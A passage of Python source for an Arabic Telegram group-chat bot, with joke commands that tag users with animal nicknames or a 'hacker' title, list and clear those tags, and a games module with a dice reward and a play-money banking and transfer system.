       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الكلاب' or text == 'مسح قائمه الكلاب':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:DOGList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الكلاب فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الكلاب')
         for cake in r.smembers(f'{Dev_Zaid}:DOGList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:DOGList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:DOGName:{cake}')

   ################# DOG #################
   
   ################# MON #################
   if text == 'رفع قرد':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:MONList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} قرد من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:MONList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:MONName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته قرد 🐒\n☆')
   
   if text == 'تنزيل قرد':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:MONList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو قرد من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:MONList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:MONName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من قرد\n☆')
   
   if text == 'قائمه القرود' or text == 'قائمة القرود':
     if not r.smembers(f'{Dev_Zaid}:MONList:{m.chat.id}'):
       return m.reply(f'{k} قائمة القرود فاضية')
     else:
       txt = '- قائمة القرود 🐒\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:MONList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:MONName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة القرود' or text == 'مسح قائمه القرود':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:MONList:{m.chat.id}'):
         return m.reply(f'{k} قائمة القرود فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة القرود')
         for cake in r.smembers(f'{Dev_Zaid}:MONList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:MONList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:MONName:{cake}')

   ################# MON #################
   
   ################# TES #################
   if text == 'رفع تيس':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:TESList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} تيس من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:TESList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:TESName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته تيس 🐐\n☆')
   
   if text == 'تنزيل تيس':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:TESList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو تيس من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:TESList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:TESName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من تيس\n☆')
   
   if text == 'قائمه التيس' or text == 'قائمة التيس':
     if not r.smembers(f'{Dev_Zaid}:TESList:{m.chat.id}'):
       return m.reply(f'{k} قائمة التيوس فاضية')
     else:
       txt = '- قائمة التيوس 🐐\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:TESList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:TESName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة التيس' or text == 'مسح قائمه التيس':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:TESList:{m.chat.id}'):
         return m.reply(f'{k} قائمة التيوس فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة التيوس')
         for cake in r.smembers(f'{Dev_Zaid}:TESList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:TESList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:TESName:{cake}')

   ################# TES #################
   
   
   ################# TOR #################
   if text == 'رفع ثور':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:TORList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ثور من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:TORList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:TORName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته ثور 🐂\n☆')
   
   if text == 'تنزيل ثور':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:TORList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو ثور من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:TORList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:TORName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من ثور\n༄')
   
   if text == 'قائمه الثور' or text == 'قائمة الثور':
     if not r.smembers(f'{Dev_Zaid}:TORList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الثور فاضية')
     else:
       txt = '- قائمة الثور 🐂\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:TORList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:TORName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الثور' or text == 'مسح قائمه الثور':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:TORList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الثور فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الثور')
         for cake in r.smembers(f'{Dev_Zaid}:TORList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:TORList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:TORName:{cake}')

   ################# TOR #################
   
   
   ################# B3S #################
   if text == 'رفع هكر':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:B3SList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} هكر من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:B3SList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:B3SName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته هكر 🏅\n☆')
   
   if text == 'تنزيل هكر':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:B3SList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو هكر من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:B3SList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:B3SName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من هكر\n☆')
   
   if text == 'قائمه الهكر' or text == 'قائمة الهكر':
     if not r.smembers(f'{Dev_Zaid}:B3SList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الهكر فاضية')
     else:
       txt = '- قائمة الهكر 🏅\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:B3SList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:B3SName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الهكر' or text == 'مسح قائمه الهكر':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:B3SList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الهكر فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الهكر')
         for cake in r.smembers(f'{Dev_Zaid}:B3SList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:B3SList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:B3SName:{cake}')

   ################# B3S #################
   
   ################# DJJ #################
   if text == 'رفع دجاجه' or text == 'رفع دجاجة':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:DJJList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} دجاجه من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:DJJList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:DJJName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته دجاجه 🐓\n☆')
   
   if text == 'تنزيل دجاجه' or text == 'تنزيل دجاجة':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:DJJList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو دجاجه من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:DJJList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:DJJName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من دجاجه\n☆')
   
   if text == 'قائمه الدجاج' or text == 'قائمة الدجاج':
     if not r.smembers(f'{Dev_Zaid}:DJJList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الدجاج فاضية')
     else:
       txt = '- قائمة الدجاج 🐓\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:DJJList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:DJJName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الدجاج' or text == 'مسح قائمه الدجاج':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:DJJList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الدجاج فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الدجاج')
         for cake in r.smembers(f'{Dev_Zaid}:DJJList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:DJJList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:DJJName:{cake}')

   ################# DJJ #################
   
   ################# HTF #################
   if text == 'رفع ملكه':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:HTFList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ملكه من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:HTFList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:HTFName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته ملكه 🧱\n☆')
   
   if text == 'تنزيل ملكه':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:HTFList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو ملكه من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:HTFList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:HTFName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من ملكه\n☆')
   
   if text == 'قائمه الهطوف' or text == 'قائمة الهطوف':
     if not r.smembers(f'{Dev_Zaid}:HTFList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الهطوف فاضية')
     else:
       txt = '- قائمة الهطوف 🧱\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:HTFList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:HTFName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الهطوف' or text == 'مسح قائمه الهطوف':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:HTFList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الهطوف فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الهطوف')
         for cake in r.smembers(f'{Dev_Zaid}:HTFList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:HTFList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:HTFName:{cake}')

   ################# HTF #################
   
   ################# SYD #################
   if text == 'رفع صياد':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:SYDList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} صياد من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:SYDList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:SYDName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته صياد 🔫\n☆')
   
   if text == 'تنزيل صياد':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:SYDList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو صياد من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:SYDList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:SYDName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من صياد\n☆')
   
   if text == 'قائمه الصيادين' or text == 'قائمة الصيادين':
     if not r.smembers(f'{Dev_Zaid}:SYDList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الصيادين فاضية')
     else:
       txt = '- قائمة الصيادين 🔫\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:SYDList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:SYDName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الصيادين' or text == 'مسح قائمه الصيادين':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:SYDList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الصيادين فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الصيادين')
         for cake in r.smembers(f'{Dev_Zaid}:SYDList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:SYDList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:SYDName:{cake}')

   ################# SYD #################
   
   ################# 5RF #################
   if text == 'رفع خروف':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:5RFList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} خروف من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:5RFList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:5RFName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته خروف 🐏\n☆')
   
   if text == 'تنزيل خروف':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:5RFList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو خروف من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:5RFList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:5RFName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من خروف\n☆')
   
   if text == 'قائمه الخرفان' or text == 'قائمة الخرفان':
     if not r.smembers(f'{Dev_Zaid}:5RFList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الخرفان فاضية')
     else:
       txt = '- قائمة الخرفان 🐏\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:5RFList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:5RFName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الخرفان' or text == 'مسح قائمه الخرفان':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:5RFList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الخرفان فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الخرفان')
         for cake in r.smembers(f'{Dev_Zaid}:5RFList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:5RFList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:5RFName:{cake}')

   ################# 5RF #################
   
   ################# TEZ #################
   if text == 'رفع هكر':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:TEZList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} هكر من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:TEZList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:TEZName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته هكر ♕\n☆')
   
   if text == 'تنزيل هكر':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:TEZList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو هكر من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:TEZList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:TEZName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من هكر\n☆')
   
   if text == 'قائمه هكر' or text == 'قائمة هكر':
     if not r.smembers(f'{Dev_Zaid}:TEZList:{m.chat.id}'):
       return m.reply(f'{k} قائمة هكر فاضية')
     else:
       txt = '- قائمة هكر ♕\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:TEZList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:TEZName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة هكر' or text == 'مسح قائمه هكر':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:TEZList:{m.chat.id}'):
         return m.reply(f'{k} قائمة هكر فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة هكر')
         for cake in r.smembers(f'{Dev_Zaid}:TEZList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:TEZList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:TEZName:{cake}')

   ################# TEZ #################
   
   ################# 🔮 #################
   
   if text == 'رفع لقلبي' and m.reply_to_message:
     return m.reply('{} رفعته لقلبك\n{} اللهم حسد 😔'.format(k,k))
   
   if text == 'تنزيل من قلبي' and m.reply_to_message:
     return m.reply('اح اح ماتوصل')
   
   ################# 🔮 #################
   
   
   
   
       
      
   
   
   
# ==================== FILE: games.py ====================
'''


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''
users_demon = {}
def is_what_percent_of(num_a, num_b):
    return (num_a / num_b) * 100

def get_top(users):
   users = [tuple(i.items()) for i in users]
   top = sorted(users, key=lambda i: i[-1][-1], reverse=True)
   top = [dict(i) for i in top]
   return top

@Client.on_message(filters.text & filters.group, group=33)
def gamesHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=gamesFunc,args=(c,m,k,channel)).start()

@Client.on_message(filters.dice & filters.group, group=45)
def diceFunc(c,m):
   if r.get(f'{m.chat.id}:disableGames:{Dev_Zaid}'):  return False
   if m.dice.emoji == "🎲":
     k = r.get(f'{Dev_Zaid}:botkey')
     if m.dice.value == 6:
        time.sleep(3)
        ra = 100
        if r.get(f'{m.from_user.id}:Floos'):
           get = int(r.get(f'{m.from_user.id}:Floos'))
           r.set(f'{m.from_user.id}:Floos',get+ra)
           floos = int(r.get(f'{m.from_user.id}:Floos'))
        else:
           floos = ra
           r.set(f'{m.from_user.id}:Floos',ra)
        return m.reply(f'''
صح عليك فزت **[بالنرد]({m.link})** ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮✔
💸فلوسك: `{floos}` ريال
☆
''', disable_web_page_preview=True)
     else:
        time.sleep(3)
        return m.reply(f"{k} للأسف خسرت بالنرد")
   

def gamesFunc(c,m,k,channel):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
       return
   if r.get(f'{m.from_user.id}:gbangames:{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'فوق'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
     text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
     text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if r.get(f'{m.chat.id}:disableGames:{Dev_Zaid}'):  return
   
   if r.get(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}'):
      if not re.findall('[0-9]+', text): 
        r.delete(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}')
        return m.reply(f'{k} لازم يكون ارقام')
      acc_id = int(re.findall('[0-9]+', text)[0])
      acc_id_from = int(r.get(f'{m.from_user.id}:bankID'))
      if acc_id == acc_id_from:
        r.delete(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}')
        return m.reply(f'{k} مافيك تحول لنفسك')
      floos_to_trans = int(r.get(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}'))
      r.delete(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}')
      if not r.sismember('BankList', m.from_user.id):
        return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
      if not r.get(f'{m.from_user.id}:Floos'):
        floos = 0
      else:
        floos = int(r.get(f'{m.from_user.id}:Floos'))
      if floos_to_trans > floos:
        return m.reply(f'{k} فلوسك ماتكفي')
      else:
        if not r.get(f'{acc_id}:getAccBank'):
          return m.reply(f'{k} مافي حساب بنكي كذا')
        else:
          id_to = int(r.get(f'{acc_id}:getAccBank'))
          if not r.sismember('BankList', id_to):
            return m.reply(f'{k} ماعنده حساب بأي بنك')
          if r.get(f'{id_to}:bankName'):
            name_to = r.get(f'{id_to}:bankName')[:10]
          else:
            gett = c.get_users(int(r.get(f'{acc_id}:getAccBank')))
            name_to = gett.first_name[:10]
            r.set(f'{id_to}:bankName',name_to)
          if floos_to_trans == floos:
            r.delete(f'{m.from_user.id}:Floos')
          else:
            r.set(f'{m.from_user.id}:Floos',floos-floos_to_trans)
          bank_to = r.get(f'{id_to}:bankType')
          bank_from = r.get(f'{m.from_user.id}:bankType')
          name_from = r.get(f'{m.from_user.id}:bankName')[:10] or m.from_user.first_name[:10]
          mention_from = f'[{name_from}](tg://user?id={m.from_user.id})'
          mention_to = f'[{name_to}](tg://user?id={id_to})'
          if not r.get(f'{id_to}:Floos'):
            floos_to = 0
          else:
            floos_to = int(r.get(f'{id_to}:Floos'))
          txt = 'حوالة صادرة\n\nمن: {}\nحساب رقم: {}\nبنك: {}\nالى: {}\nحساب رقم: {}\nبنك: {}'.format(mention_from,acc_id_from,bank_from,mention_to,acc_id,bank_to)
          if bank_from != bank_to:
             floos_to_tran = int(floos_to_trans-floos_to_trans/10)
             txt += '\nخصمت 10% ضريبة بنك الى بنك'
             txt += f'\nالمبلغ: {floos_to_tran} ريال 💸'
          else:
             floos_to_tran = floos_to_trans
             txt += f'\nالمبلغ: {floos_to_tran} ريال 💸'
          r.set(f'{id_to}:Floos',floos_to+floos_to_tran)
          return m.reply(txt, disable_web_page_preview=True)

   if r.get(f'{m.from_user.id}:createBank:{m.chat.id}'):
     r.delete(f'{m.from_user.id}:createBank:{m.chat.id}')
     if r.get(f'{m.from_user.id}:bankID'):
       id = int(r.get(f'{m.from_user.id}:bankID'))
       floos_to_add = 0
     else:
       id = '4'
       floos_to_add = 2000
       for a in range(15):
         id += str(random.randint(1,9))
     if not r.get(f'{m.from_user.id}:Floos'):
       floos = 0
     else:
       floos = int(r.get(f'{m.from_user.id}:Floos'))
     '''
     if not text in ['الاهلي','راجحي', 'الانماء','عبد الفتاح السيسي']:
       return m.reply(f'{k} مافيه بنك بهالاسم')
     '''
     if not text in ['الاهلي','راجحي', 'الانماء']:
       return m.reply(f'{k} مافيه بنك بهالاسم')
     card = random.choice(['الاهلي كارد','الراجحي كارد','الإنماء كارد','مدى كارد'])
     if text == 'الاهلي':
        r.set(f'{m.from_user.id}:bankType', 'الاهلي')
        r.set(f'{m.from_user.id}:bankID', int(id))
        r.set(f'{m.from_user.id}:bankCard',card)
     if text == 'راجحي':
        r.set(f'{m.from_user.id}:bankType', 'راجحي')
        r.set(f'{m.from_user.id}:bankID', int(id))
        r.set(f'{m.from_user.id}:bankCard',card)
     if text == 'الانماء':
        r.set(f'{m.from_user.id}:bankType', 'الانماء')
        r.set(f'{m.from_user.id}:bankID', int(id))
        r.set(f'{m.from_user.id}:bankCard',card)
     '''
     if text == 'عبد الفتاح السيسي':
        r.set(f'{m.from_user.id}:bankType', 'بلحة الدولي')
